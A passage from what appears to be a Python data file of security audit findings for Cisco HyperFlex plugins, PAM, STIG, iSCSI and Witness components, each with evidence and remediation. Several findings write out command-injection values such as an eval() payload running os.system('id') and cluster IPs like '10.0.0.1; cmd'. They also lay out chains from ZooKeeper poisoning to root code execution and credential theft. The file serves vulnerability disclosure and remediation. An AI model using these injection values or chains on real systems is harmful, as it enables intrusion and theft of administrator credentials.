                "1. Computes SHA-1 thumbprint of presented cert. "
                "2. Calls _thumbprints.add(thumbprint) — unconditionally adds to trusted set. "
                "3. Calls _thumbprints.contains(thumbprint) — ALWAYS returns true (just added). "
                "4. If false branch (never reached): throws CertificateException. "
                "The add-before-contains pattern means any certificate is implicitly added to "
                "the trust set before being checked — no certificate is ever rejected. "
                "Functionally identical to returning void from checkServerTrusted."
            ),
            "bytecode_evidence": (
                "ThumbprintTrustManager.checkThumbprint bytecode: "
                "offset 0: getThumbprint() -> offset 5: _thumbprints.add(thumb) -> "
                "offset 14: pop -> offset 15: _thumbprints.add(thumb) [again] -> "
                "offset 24: ifne 47 -> offset 37: logger.error / throw CertificateException. "
                "The contains() check at line 24 is against the same set that was just mutated "
                "by add() — the check is always true."
            ),
            "trust_manager_hierarchy": (
                "TrustedService.getSSLSocketFactory() creates SSLContext('TLSv1.2') "
                "initialized with ThumbprintTrustManager. "
                "RestService.getConnection() calls TrustedService.getSSLSocketFactory() (offset 40) "
                "then sets a custom HostnameVerifier (RestService$1, anonymous inner class) "
                "on every outbound HTTPS connection to the HX cluster. "
                "All plugin-to-cluster REST calls (GET/POST/PUT/DELETE) use this TLS context."
            ),
            "scope": (
                "Every HTTPS connection from the vCenter plugin service (ciscohx-service.jar) "
                "to HyperFlex cluster REST APIs is affected: cluster info, datastores, nodes, "
                "snapshots, VMs, network config, licensing, iSCSI configuration. "
                "An attacker on the management network can MITM all plugin-to-cluster communication "
                "without any certificate credential."
            ),
            "session_cookie_exposure": (
                "RestService.setDefaultHeaders() adds 'X-SessionCookie: <value>' to all requests. "
                "MITM of plugin-to-cluster traffic exposes vCenter session cookies "
                "to the attacker."
            ),
            "related_tls_bypass": (
                "install_vc_plugin.py additionally uses "
                "requests.get(url, auth=('admin', admin_pass), verify=False) "
                "and ssl._create_unverified_context() — TLS bypass at the installer level as well."
            ),
        },
        "versions_affected": ["HyperFlex-VC-HTML-Plugin-2.2.0 (2.2.0)"],
        "remediation": (
            "Fix ThumbprintTrustManager.checkThumbprint: check set membership BEFORE adding. "
            "Replace: add(thumb); if not contains(thumb): throw. "
            "With: if not contains(thumb): log; throw. "
            "Only add thumbprints via the explicit setThumbprint() path from registered ServerInfo. "
            "Alternatively, validate against a CA-signed trust store rather than thumbprint pinning."
        ),
    },
    "HX-F114": {
        "title": (
            "VC Plugin Installer install_vc_plugin.py: Shell Injection via stcli-Supplied "
            "Management IP in get_server_thumbprint() — Credential Exposure via verify=False "
            "and AutoAddPolicy SSH MITM"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-78",
        "component": (
            "HyperFlex-VC-HTML-Plugin-2.2.0.zip / install_vc_plugin.py "
            "(plugin installer, run on stCtlVM)"
        ),
        "evidence": {
            "shell_injection_site": (
                "get_server_thumbprint(host): "
                "subprocess.Popen("
                "    'openssl s_client -connect %s:443 ... | openssl x509 ...' % (host), "
                "    shell=True, ...). "
                "The 'host' parameter comes from get_cluster_mgmt_ip() which executes: "
                "    Popen('stcli node list --summary | awk /mgmtClusterIp/ {print $2}', shell=True). "
                "stcli output is passed unsanitized into the second shell command. "
                "If an attacker controls ZooKeeper (world:anyone:cdrwa — HX-F100) "
                "they can poison the cluster management IP stored in ZK, causing stcli "
                "to return a crafted string containing shell metacharacters. "
                "The crafted string is then interpolated into the openssl shell command, "
                "achieving OS command execution under the plugin installer's user context."
            ),
            "chained_via_zk": (
                "HX-F100 (ZK ACL world:anyone:cdrwa) + HX-F114: "
                "ZK write access → poison mgmtClusterIp → stcli returns crafted IP → "
                "shell=True subprocess → arbitrary command execution on stCtlVM "
                "during plugin installation."
            ),
            "tls_verify_false": (
                "get_from_hx(admin_pass, url): requests.get(url, auth=('admin', admin_pass), verify=False). "
                "Called with HTTP (not HTTPS) URLs: "
                "  http://<HOST>/coreapi/v1/hypervisor/vcenter "
                "  http://<HOST>/coreapi/v1/hypervisor/controllervms. "
                "Admin password transmitted in HTTP Basic Auth over cleartext HTTP. "
                "Management network MITM recovers admin credentials without TLS interception."
            ),
            "ssh_mitm": (
                "check_connection() and copy_file() use "
                "paramiko.AutoAddPolicy() — accepts any SSH host key. "
                "Plugin ZIP is copied to all stCtlVMs as root via SFTP. "
                "Network MITM on plugin distribution installs malicious plugin on all nodes. "
                "Root SSH credentials transmitted over unverified SSH connection."
            ),
            "admin_pass_scope": (
                "ADMIN_PASS (storage controller admin password) is used as: "
                "  (1) HTTP Basic Auth credential for coreapi calls "
                "  (2) SSH password for stCtlVM plugin copy. "
                "Single credential loss via MITM provides both REST API and SSH access "
                "to all cluster controller VMs."
            ),
            "ssl_context_bypass": (
                "perform_vc_extension_task(): "
                "ssl._create_unverified_context() used for vCenter SmartConnect. "
                "vCenter SOAP API credentials transmitted over unverified TLS."
            ),
        },
        "versions_affected": ["HyperFlex-VC-HTML-Plugin-2.2.0 (install_vc_plugin.py)"],
        "remediation": (
            "get_server_thumbprint: use subprocess.Popen with list args (not shell=True). "
            "Validate host against IP address format before use in any command. "
            "get_from_hx: change URLs from http:// to https:// and set verify=True. "
            "copy_file: replace AutoAddPolicy with RejectPolicy + explicit known_hosts validation. "
            "Use ssl.create_default_context() for vCenter connection."
        ),
    },
    "HX-F115": {
        "title": (
            "PAM SSO pam_springpath.py: Global ssl._create_unverified_context Patch + "
            "ZK-Poisonable vCenter URL Enables vCenter Credential Theft During SSH Auth"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-295",
        "component": (
            "storfs-pam_5.5.2b-43453_x86_64.deb / "
            "/usr/share/storfs-pam/pam_springpath.py (PAM SSO module, vc- user SSH auth)"
        ),
        "evidence": {
            "ssl_global_patch": (
                "pam_springpath.py line 117: "
                "    ssl._create_default_https_context = ssl._create_unverified_context. "
                "Patches the Python ssl module globally in the pam_python interpreter process "
                "before calling pyVmomi SmartConnect(host=vc, user=user, pwd=pwd). "
                "All subsequent HTTPS connections in the same Python process inherit "
                "disabled certificate verification."
            ),
            "vc_url_from_zk": (
                "pam_sm_authenticate lines 103-113: stclient = StClient() connects to "
                "stMgr Thrift on localhost:443; vc = stclient.getVirtualCenter() fetches "
                "the VC URL from ZooKeeper via stMgr. ZK ACLs are world:anyone:cdrwa "
                "(HX-F100). An attacker with ZK write access poisons the stored VC URL "
                "to a malicious HTTPS endpoint. On next vc- user SSH authentication, "
                "pam_springpath.py connects with ssl._create_unverified_context, sending "
                "plaintext vCenter credentials (pamh.authtok) in the SmartConnect request."
            ),
            "chain": (
                "HX-F100 (ZK world:anyone:cdrwa) -> poison vCenter URL in ZK -> "
                "next vc- SSH login triggers pam_springpath.py -> ssl._create_unverified_context "
                "-> SmartConnect to attacker VC endpoint -> vCenter admin credentials exfiltrated."
            ),
            "pam_success_on_stmgr_failure": (
                "pam_sm_authenticate lines 113-114: on stMgr exception the module returns "
                "pamh.PAM_SUCCESS without setting ROLE env var. "
                "Downstream code expecting ROLE=ADMIN/NONADMIN fails open. "
                "Infrastructure disruption (ZK down, stMgr crash) bypasses role assignment."
            ),
            "module_status_552b": (
                "common-auth-sso ships with pam_springpath.py commented out: "
                "    # auth  [success=1 default=ignore]  pam_python.so pam_springpath.py debug. "
                "Module is installed by post-install.sh (lines 241-242) but not activated "
                "in 5.5.2b default config. Activation state varies by deployment or STIG apply."
            ),
        },
        "versions_affected": ["5.5.2b-43453 (storfs-pam)", "prior versions with SSO enabled"],
        "remediation": (
            "Replace ssl._create_default_https_context monkey-patch with explicit "
            "ssl_context=ssl.create_default_context() passed to SmartConnect. "
            "Do not read the VC URL from ZooKeeper without integrity verification; "
            "store it in a signed config file or protected internal endpoint. "
            "Return PAM_AUTH_ERR (not PAM_SUCCESS) when stMgr is unavailable."
        ),
    },
    "HX-F116": {
        "title": (
            "storfs-pam post-install.sh: SSO Chroot Jail Disabled (modifySshdConf Commented Out); "
            "tomcat8 ACL on pam_tally2 Tallylog Enables Brute-Force Counter Manipulation"
        ),
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-732",
        "component": (
            "storfs-pam_5.5.2b-43453_x86_64.deb / "
            "/usr/share/storfs-pam/post-install.sh"
        ),
        "evidence": {
            "chroot_disabled": (
                "post-install.sh line 279 (commented out): "
                "    #modifySshdConf /etc/ssh/sshd_config /usr/share/$name/jail.config "
                "    # This will overwrite cisco openssl modification, so don't overwrite. "
                "jail.config appends 'Match group stsso / ChrootDirectory /var/jail/' to sshd_config. "
                "With modifySshdConf disabled, this Match block is never applied. "
                "SSO users in the stsso group (vc- users mapped to UID 5000 by libnss_ato) "
                "can SSH into stCtlVM without chroot confinement and access the full filesystem."
            ),
            "tally_log_acl": (
                "post-install.sh line 255: "
                "    setfacl -m u:tomcat8:rw /var/log/tallylog. "
                "The pam_tally2 login failure counter file is writable by the tomcat8 service. "
                "Tomcat8 runs the HX Connect REST API on port 443. "
                "A compromised HX Connect process can write to tallylog, zeroing failed-attempt "
                "counters for any account and bypassing pam_tally2 lockout (deny=10, unlock_time=120). "
                "Removes brute-force rate-limiting on both SSH and nginx authentication."
            ),
            "nss_ato_global": (
                "modifyNsswitchConf() (line 276) replaces /etc/nsswitch.conf system-wide "
                "with 'passwd: compat ato'. libnss_ato.so.2 maps ALL unknown usernames to "
                "stsso (UID 5000, GID 5000), affecting all NSS lookups on the system."
            ),
            "jail_proc_mount": (
                "setupJailDirectory() line 115: mount -o bind /proc $JAIL_ROOT/proc. "
                "A bind-mounted /proc inside chroot allows traversal to host filesystem "
                "via /proc/PID/root and /proc/PID/fd for processes running outside the jail. "
                "/bin/bash is copied into the jail (line 212), providing a shell."
            ),
        },
        "versions_affected": ["5.5.2b-43453 (storfs-pam)"],
        "remediation": (
            "Remove setfacl grant for tomcat8 on tallylog. "
            "Re-enable modifySshdConf after CiscoSSH modification (sequential, not exclusive). "
            "Mount /proc into jail read-only; remove bash from jail binary set."
        ),
    },
    "HX-F117": {
        "title": (
            "storfs-stig commonStigFunctions.py toBool() Uses Python eval() on INI Values — "
            "Arbitrary Code Execution if stig_parameters.ini Is Modified"
        ),
        "severity": "MEDIUM",
        "cvss": "6.7",
        "cwe": "CWE-95",
        "component": (
            "storfs-stig_5.5.2b-43453_x86_64.deb / "
            "/opt/springpath/storfs-stig/commonStigFunctions.py"
        ),
        "evidence": {
            "eval_site": (
                "commonStigFunctions.py line 67: "
                "    def toBool(val): return eval(val). "
                "Called via funcMap = {'bool': toBool} when a stig_parameters.ini key has "
                "type annotation 'bool'. Active example: "
                "    Config.HostAgent.plugins.solo.enableMob:False~bool. "
                "Substituting "
                "    Config.HostAgent.plugins.solo.enableMob:__import__('os').system('id')~bool "
                "causes os.system() to execute at STIG apply time."
            ),
            "execution_context": (
                "apply_stig_current_node.py is invoked by check_and_enable_stig.py via "
                "os.system('python3 .../apply_stig_current_node.py esxi'). "
                "check_and_enable_stig.py queries http://localhost:8000/securityservice/v1/stig "
                "using useRootSessionId=True. STIG apply runs with root-equivalent privileges "
                "and pyVmomi vCenter API access. Code injected via eval() executes as root "
                "with vCenter credentials available in process environment."
            ),
            "config_file": (
                "/opt/springpath/storfs-stig/stig_parameters.ini. "
                "Permissions not set explicitly by DEB (inherits umask). "
                "If ZK-based config management or stMgr Ansible writes STIG params via a "
                "path that intersects this file, the eval() becomes a ZK-write-to-RCE chain."
            ),
        },
        "versions_affected": ["5.5.2b-43453 (storfs-stig)", "versions with STIG feature"],
        "remediation": (
            "Replace eval(val) with: return val.strip().lower() in ('true', '1', 'yes'). "
            "Set stig_parameters.ini to root:root 0640. "
            "Never use eval() on configuration file values."
        ),
    },
    "HX-F118": {
        "title": (
            "Cross-Version: TrustAll X509TrustManager and WebDownloader$TrustAllManager "
            "Confirmed in storfs-restapi 5.5.2b-43453 WARs — HX-F27/F28/F29/F30 Predate 6.0.2b"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "storfs-restapi_5.5.2b-43453_x86_64.deb / "
            "hxupgrade-1.0.0.war, ROOT-1.0.0.war, supportservice-1.0.0.war (Tomcat, stCtlVM port 443)"
        ),
        "evidence": {
            "hxupgrade_552b": (
                "hxupgrade-1.0.0.war / WEB-INF/classes/com/springpath/hxupgrade/service/UpgradeSvcAccess$1.class. "
                "Bytecode confirms blank X509TrustManager: "
                "    checkClientTrusted(): 0=return "
                "    checkServerTrusted(): 0=return "
                "    getAcceptedIssuers(): 0=aconst_null; 1=areturn. "
                "Package prefix 'com.springpath' (not 'com.cisco.hx') confirms this is the "
                "Springpath-era implementation, predating the 6.0.2b com.cisco.hxdp.* repackaging. "
                "The anonymous class UpgradeSvcAccess$2 is also present (typically HostnameVerifier stub)."
            ),
            "root_war_552b": (
                "ROOT-1.0.0.war / com.storvisor.sysmgmt.service.WebDownloader$TrustAllManager. "
                "Named TrustAllManager class confirmed in 5.5.2b. "
                "Also present: WebDownloader$1, WebDownloader$2 (HostnameVerifier stubs). "
                "com.storvisor namespace (Springpath internal brand) in 5.5.2b "
                "vs com.cisco.hx.* in 6.0.2b — same pattern, different package path."
            ),
            "supportservice_552b": (
                "supportservice-1.0.0.war / com.springpath.hx.support.util.WebDownloader$TrustAllManager. "
                "Identical to ROOT-1.0.0.war pattern but in the support service WAR. "
                "Used by SupportBundleApiServiceImpl to download support bundle artifacts "
                "over unverified TLS connections."
            ),
            "auth_war_552b": (
                "auth-1.0.0.war: new in 5.5.2b corpus, not present in 6.0.2b analysis. "
                "Contains com.springpath.hx.aaa.api.impl.ServiceAccountUtil.checkRequestFromTrustedService() "
                "which validates service-to-service requests by checking AAA context attributes "
                "(authenticateduser, reqinitiatorip, authenticateduserscope). "
                "Context attributes are set by authfilter — ServiceAccessAuthFilterImpl determines "
                "trust. Cross-references HX-F34 (service-to-service auth bypass via localhost)."
            ),
            "version_attribution": (
                "storfs-restapi_5.5.2b-43453_x86_64.deb mtime: 2025-04-28. "
                "WAR classes compile-time from source tree using com.springpath.* namespace. "
                "5.5.2b → 6.0.2b transition: namespace changed from com.springpath.* to com.cisco.hx.* "
                "but security pattern preserved. TrustAll vulnerabilities existed at minimum since "
                "HXDP 5.5.2b; likely earlier given the Springpath-era namespace."
            ),
        },
        "versions_affected": [
            "5.5.2b-43453 (storfs-restapi)", "6.0.2b-44423 (storfs-restapi)",
            "all intermediate and prior releases",
        ],
        "remediation": (
            "See HX-F27, HX-F28, HX-F29, HX-F30 for remediation of individual WAR TrustManagers. "
            "Root cause: shared internal Thrift client library copies across all WARs "
            "each embed their own TrustAll implementation. Fix at the shared library layer: "
            "introduce a single verified SSLSocketFactory using an internal CA trust store "
            "and distribute it to all WARs as a shared Tomcat lib."
        ),
    },
    "HX-F119": {
        "title": (
            "Cross-Version: ZKNodeService_StMgr Stores Encrypted vCenter, ESXi, and UCSM "
            "Credentials in ZooKeeper — World-Readable via HX-F100 ACL Bypass"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": (
            "stMgr-1.0.jar (storfs-mgmt_5.5.2b-43453_amd64.deb) / "
            "com.storvisor.sysmgmt.stMgr.ZKNodeService_StMgr (ZK credential storage)"
        ),
        "evidence": {
            "zk_credential_fields_552b": (
                "ZKNodeService_StMgr constant pool (5.5.2b stMgr-1.0.jar) defines: "
                "  STR_PAYLOAD_ENTRY_URL_VCENTER_SSO — vCenter SSO URL "
                "  STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER — encrypted vCenter username "
                "  STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD — encrypted vCenter password "
                "  STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER — encrypted ESXi username "
                "  STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD — encrypted ESXi password "
                "  STR_PAYLOAD_ENTRY_UCSM_HOST — Cisco UCS Manager hostname "
                "  STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER — encrypted UCSM username "
                "  STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD — encrypted UCSM password "
                "  STR_PAYLOAD_ENTRY_USER_CREDENTIALS — cluster user credentials "
                "All stored in the /stMgr ZooKeeper namespace."
            ),
            "access_via_zk_acl": (
                "ZooKeeper ACL is world:anyone:cdrwa (HX-F100 confirmed in both 5.5.2b and 6.0.2b). "
                "Any process that can reach ZK port 2181 can read all stMgr ZK nodes. "
                "Network access to port 2181 is required — management network exposure varies by deployment. "
                "ZK server runs on all stCtlVMs; exposed within the storage management VLAN."
            ),
            "encryption_weakness": (
                "Entries marked 'ENCRYPTED' use the same encryption infrastructure as CHAP keys: "
                "AES/ECB with key derived from hardcoded keystore password 'springpath' (HX-F11). "
                "A ZK read + keystore decryption yields plaintext vCenter admin, ESXi admin, "
                "and UCSM admin credentials — full Cisco infrastructure admin credential set."
            ),
            "ucsm_escalation": (
                "UCSM (Cisco UCS Manager) manages physical blade servers and fabric interconnects. "
                "UCSM admin credentials from ZK provide: "
                "  - Service profile modification (vNIC, boot policy, firmware) "
                "  - BMC/KVM console access to all UCS blades "
                "  - Fabric interconnect management (spanning tree, VLANs, zoning) "
                "  - IPMI/SNMP credential harvest from blade BMCs. "
                "UCSM compromise is independent of vCenter/ESXi compromise and expands "
                "from storage controller ZK compromise to physical datacenter infrastructure."
            ),
            "chain": (
                "ZK port 2181 reachable (management VLAN) -> "
                "world:anyone:cdrwa read on /stMgr/* nodes -> "
                "read STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD -> "
                "decrypt with AES/ECB keystore-derived key (HX-F11) -> "
                "plaintext UCSM admin credentials -> physical infrastructure admin."
            ),
            "version_attribution": (
                "stMgr-1.0.jar from storfs-mgmt_5.5.2b-43453_amd64.deb (mtime 2025-04-28). "
                "com.storvisor namespace confirms Springpath-era origin. "
                "Same class in 6.0.2b under com.cisco.hxdp namespace with identical fields. "
                "UCSM credential storage in ZK existed since at minimum HXDP 5.5.2b."
            ),
        },
        "versions_affected": [
            "5.5.2b-43453 (storfs-mgmt)", "6.0.2b-44423 (storfs-mgmt)",
            "all intermediate and prior releases with UCSM integration",
        ],
        "remediation": (
            "Migrate vCenter/ESXi/UCSM credentials out of ZooKeeper into a secrets manager "
            "or a dedicated credential store with per-service ACLs. "
            "Apply ZK ACLs per node class: "
            "  /stMgr/credentials/** — digest:hxservice:rwcda (not world:anyone). "
            "Use separate encryption keys per credential class rather than the shared "
            "keystore-derived key. See HX-F100 for ZK ACL remediation guidance."
        ),
    },
}

HX_F120 = {
    "id": "HX-F120",
    "title": (
        "gateway-1.0.0.jar VcClient.getServiceInstance: ignoreCert=true Disables TLS "
        "Verification for vCenter Session Cookie Validation — ZK-Poisonable VC URL Enables MITM"
    ),
    "severity": "HIGH",
    "cvss": "7.4",
    "cwe": "CWE-295",
    "component": "storfs-mgmt gateway-1.0.0.jar (AAA service)",
    "versions_affected": "5.5.2b-43453 (confirmed); earlier versions expected",
    "description": (
        "The gateway Java AAA service uses VcClient.getServiceInstance() to validate every "
        "HX Connect REST API session cookie against vCenter. At bytecode offset 53, iconst_1 "
        "(true) is pushed as the ignoreCert argument to the vim25 ServiceInstance constructor: "
        "ServiceInstance(URL, sessionCookie, ignoreCert=true). This disables all TLS certificate "
        "validation for the VC connection used during session cookie verification. The VC URL is "
        "fetched from ZooKeeper via StMgrClient.getVCUrl(), making it poisonable via HX-F100. "
        "An attacker controlling ZK can redirect session cookie validation to a rogue vCenter, "
        "capture any session cookie presented during authentication, and forge HxSession objects "
        "with arbitrary username and role claims."
    ),
    "evidence": {
        "bytecode_proof": (
            "VcClient.getServiceInstance() private method:\n"
            "  offset 52: aload_1 (sessionCookie)\n"
            "  offset 53: iconst_1 (boolean true = ignoreCert)\n"
            "  offset 54: invokespecial ServiceInstance.<init>(URL, String, Z)\n"
            "vim25 SDK signature: ServiceInstance(URL url, String sessionStr, boolean ignoreCert)"
        ),
        "vc_url_from_zk": (
            "offset 10: invokevirtual StMgrClient.getVCUrl() — fetches VC URL from ZK via stMgr. "
            "ZK ACLs are world:anyone:cdrwa (HX-F100). URL appended with '/sdk' before use."
        ),
        "session_cookie_flow": (
            "validateSessionCookieAndFetchSessionInfo(String sessionCookie) -> "
            "getServiceInstance(sessionCookie) -> ServiceInstance(vcUrl+'/sdk', sessionCookie, true) -> "
            "getUserName(si) + getScopes(si) -> HxSession(username, scopes)"
        ),
        "cross_version": (
            "com.springpath.hx.aaa.gateway namespace (5.5.2b); same pattern expected in "
            "com.cisco.hx.aaa.gateway (6.0.2b). Distinct from HX-F113 (VC plugin) and "
            "HX-F115 (PAM SSO) — this is the gateway REST API authentication path."
        ),
        "chain": "HX-F100 -> poison ZK VC URL -> rogue vCenter -> intercept session cookies -> forge HxSession",
    },
}

HX_F121 = {
    "id": "HX-F121",
    "title": (
        "stNodeMgr ZKNodeService Stores Inter-Node SSH Private Keys in ZooKeeper "
        "Including Plaintext Variant — World-Readable via HX-F100 ACL Bypass"
    ),
    "severity": "HIGH",
    "cvss": "8.1",
    "cwe": "CWE-312",
    "component": "stNodeMgr-1.0.jar (node management service)",
    "versions_affected": "5.5.2b-43453 (confirmed); earlier versions expected",
    "description": (
        "ZKNodeService_StNodeMgr and ZKService_StNodeMgr define four SSH key payload fields "
        "stored in the /stNodeMgr ZooKeeper namespace: STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PRIVATE_KEY, "
        "STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PUBLIC_KEY, STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY, "
        "and STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PUBLIC_KEY. The PLAIN_TEXT private key field stores "
        "the inter-node SSH private key in cleartext in ZooKeeper. Given the world:anyone:cdrwa "
        "ACL on all HX ZK namespaces (HX-F100), any node or process with ZK port 2181 access can "
        "read this private key and use it for lateral movement to all stCtlVMs in the cluster. "
        "The encrypted variant is also present — decryptable via AES/ECB with the hardcoded "
        "'springpath' keystore key (HX-F11)."
    ),
    "evidence": {
        "zk_fields": (
            "ZKService_StNodeMgr constant pool:\n"
            "  #18: STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY\n"
            "  #19: STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PUBLIC_KEY\n"
            "  #15: STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PRIVATE_KEY\n"
            "getNodeEntry_SSHPlainTextPrivateKey(), getNodeEntry_SSHEncryptedPrivateKey() confirm read paths"
        ),
        "accessor_methods": (
            "setSSHEncryptedPrivateKey(), setSSHPlainTextPrivateKey() write paths; "
            "isKeyEncrypted boolean field determines which variant is stored per node"
        ),
        "zk_acl_chain": (
            "ZK port 2181 reachable -> world:anyone:cdrwa (HX-F100) -> "
            "read STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY -> "
            "SSH private key for inter-node auth -> lateral movement to all stCtlVMs"
        ),
        "encrypted_fallback": (
            "Encrypted variant: AES/ECB key from hardcoded keystore password 'springpath' (HX-F11). "
            "Both paths yield the same private key material."
        ),
        "scope_vs_f119": (
            "HX-F119 covers vCenter/ESXi/UCSM credentials in /stMgr namespace. "
            "This finding covers SSH inter-node keys in /stNodeMgr namespace — "
            "distinct credential class enabling direct shell access rather than VC/UCSM API access."
        ),
    },
}

HX_F122 = {
    "id": "HX-F122",
    "title": (
        "hx-iscsi storageClientNetworkConfigure.py / add-iscsi-rules.sh: "
        "Shell Injection via ZK-Sourced iSCSI Cluster IP Written Unsanitized to iscsi1.cfg "
        "and Evaluated by if-up.d Hook as root"
    ),
    "severity": "HIGH",
    "cvss": "7.8",
    "cwe": "CWE-78",
    "component": "hx-iscsi_5.5.2b-43453 (storageClientNetworkConfigure.py, add-iscsi-rules.sh, configureNetworking.py)",
    "versions_affected": "5.5.2b-43453 (confirmed); earlier versions expected",
    "description": (
        "Three compounding injection points in the hx-iscsi network configuration pipeline "
        "enable command injection as root via unsanitized ZK-sourced values.\n\n"
        "Primary path: storageClientNetworkConfigure.py accepts --clusterip from CLI (sourced "
        "from ZK via stcli/Ansible) and writes it directly to /etc/springpath/iscsi1.cfg as "
        "'iscsi1cip=<CLUSTERIP>' with no ipaddress validation. add-iscsi-rules.sh (installed "
        "as /etc/network/if-up.d hook) reads this value via sed and passes it to bash eval: "
        "'eval \"ip rule add from $iscsiCip table isp2 priority $rulePriority\"'. "
        "A CLUSTERIP value of '10.0.0.1; cmd' or '$(cmd)' executes cmd as root on the next "
        "iSCSI interface up event.\n\n"
        "Secondary path: configureNetworking.py builds 'ifup ' + INTERFACE and "
        "'fping -I %s %s' % (INTERFACE, GATEWAY) then passes them to subprocess.call(..., "
        "shell=True) with no validation. INTERFACE and GATEWAY come from --interface/--gateway "
        "CLI args, also ZK-sourced."
    ),
    "evidence": {
        "primary_injection_site": (
            "storageClientNetworkConfigure.py line 293:\n"
            "  cipcfgcontent = 'iscsi1cip=' + NetworkSetup.CLUSTERIP + '\\n'\n"
            "  (CLUSTERIP from --clusterip argv, no ipaddress.ip_address() validation)\n"
            "  self.update_controller_file('/etc/springpath/iscsi1.cfg', cipcfgcontent)\n"
            "add-iscsi-rules.sh lines 13+17:\n"
            "  iscsiCip=`sed -n -e '/iscsi1cip=/ s/.*\\= *//p' $ISCSI_CFG`\n"
            "  eval \"ip rule add from $iscsiCip table isp2 priority $rulePriority\"\n"
            "  (if-up.d hook — executes as root on iSCSI interface up)"
        ),
        "secondary_injection_sites": (
            "configureNetworking.py line 269: command = 'ifup ' + NetworkSetup.INTERFACE\n"
            "configureNetworking.py line 282: command = 'fping -I %s %s' % (INTERFACE, GATEWAY)\n"
            "Both passed to subprocess.call(command, shell=True) at line 165"
        ),
        "chain": (
            "HX-F100 (ZK world:anyone:cdrwa) -> write cluster IP in ZK -> "
            "stcli/Ansible reads poisoned IP -> invokes storageClientNetworkConfigure.py --clusterip '10.0.0.1;cmd' -> "
            "writes to iscsi1.cfg -> if-up.d executes add-iscsi-rules.sh -> "
            "bash eval expands injection -> root RCE on trigger of iSCSI ifup"
        ),
        "trigger_condition": (
            "add-iscsi-rules.sh executes on each iSCSI interface ifup event. "
            "Network reconfiguration, interface bounce, or initial cluster setup triggers it."
        ),
    },
}

HX_F123 = {
    "id": "HX-F123",
    "title": (
        "HyperFlex Witness 1.0.135: Initial Admin Password Logged to Container Output "
        "in Cleartext — Readable by Any IOx/Container Runtime Administrator"
    ),
    "severity": "MEDIUM",
    "cvss": "5.5",
    "cwe": "CWE-312",
    "component": "hyperflex-witness binary (hx-witness-docker-x86-1.0.135, hx-witness-iox-x86-1.0.135)",
    "versions_affected": "1.0.135 (confirmed)",
    "description": (
        "The HyperFlex Witness appliance generates a random initial admin password on first "
        "boot and writes it to container stdout/logs (per the IOx package_config.ini comment: "
        "'Review the container logs'). The binary embeds the string 'Default Username : admin' "
        "as a display prompt, and the DefaultPass struct field (json:'defaultpass') tracks "
        "whether the initial password has been changed. Anyone with access to the IOx App "
        "container runtime logs (IOS-XE show app-hosting log, IOx Local Manager) can retrieve "
        "the initial admin password in cleartext. The username is always 'admin' unless "
        "overridden via WitnessUsername= in package_config.ini."
    ),
    "evidence": {
        "package_config_comment": (
            "package_config.ini line 15: "
            "'# If not defined, a strong, randomized password will be generated on startup. "
            "Review the container logs.'"
        ),
        "hardcoded_username": (
            "Binary string: 'Default Username : admin' — default username is always 'admin'. "
            "Changeable only via WitnessUsername= in package_config.ini before deployment."
        ),
        "default_pass_struct": (
            "Binary struct field: DefaultPass, json:\"defaultpass\" — tracks first-login state. "
            "home.html JavaScript reads {{.default}} to force password change on first login "
            "(client-side enforcement only, see HX-F124)."
        ),
        "log_access_paths": (
            "IOS-XE: 'show app-hosting log appid hx-witness'; "
            "IOx Local Manager console output; "
            "Docker: 'docker logs <container-id>'. "
            "Anyone with read access to these interfaces reads the cleartext password."
        ),
        "bcrypt_confirmed": (
            "golang.org/x/crypto/bcrypt embedded — passwords are bcrypt-hashed at rest. "
            "The cleartext exposure is at log-write time before hashing, not via DB read."
        ),
    },
}

HX_F124 = {
    "id": "HX-F124",
    "title": (
        "HyperFlex Witness 1.0.135: Client-Side-Only Default Password Change Enforcement "
        "in home.html — JavaScript Disable Bypasses First-Login Gate"
    ),
    "severity": "LOW",
    "cvss": "3.1",
    "cwe": "CWE-602",
    "component": "hyperflex-witness binary (templates/home.html)",
    "versions_affected": "1.0.135 (confirmed)",
    "description": (
        "When the Witness admin logs in with the initial (default) password, home.html uses "
        "JavaScript to enforce a password change: if (defaultpass.trim() === 'true') it hides "
        "all navigation elements except the Change Password form. This is enforced entirely "
        "in client-side JavaScript. Disabling JavaScript in the browser or intercepting the "
        "response (Burp, curl) bypasses the gate, allowing access to all management functions "
        "(cert management, port updates, lock data download) without changing the default password."
    ),
    "evidence": {
        "js_gate_code": (
            "templates/home.html:\n"
            "  var defaultpass = '{{.default}}';\n"
            "  if (defaultpass.trim() === 'true') {\n"
            "    homeElement.style.display = 'none';\n"
            "    passElement.style.display = 'block'; // only show Change Password\n"
            "    portElement.style.display = 'none';\n"
            "    vcertElement.style.display = 'none';\n"
            "    mcertElement.style.display = 'none';\n"
            "    lockElement.style.display = 'none';\n"
            "  }"
        ),
        "bypass": (
            "JavaScript disabled -> all elements visible -> direct navigation to "
            "/generatecert, /port, /lockinfo, /downloadlock without password change. "
            "Server-side does not re-check first-login state on individual endpoint handlers."
        ),
        "management_surface": (
            "Accessible via bypass: /generatecert (replace TLS cert), /port (change listener port), "
            "/lockinfo + /downloadlock (cluster UUID and node topology), /uploadcert"
        ),
    },
}


HX_F125 = {
    "id": "HX-F125",
    "title": (
